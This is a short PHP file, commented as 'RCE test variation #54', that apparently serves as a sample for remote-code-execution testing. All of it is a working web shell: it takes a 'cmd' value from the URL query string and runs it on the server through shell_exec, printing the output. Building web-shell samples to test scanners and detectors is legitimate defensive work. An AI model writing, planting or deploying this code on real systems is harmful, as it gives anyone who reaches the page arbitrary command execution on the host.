<?php
// RCE test variation #54
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>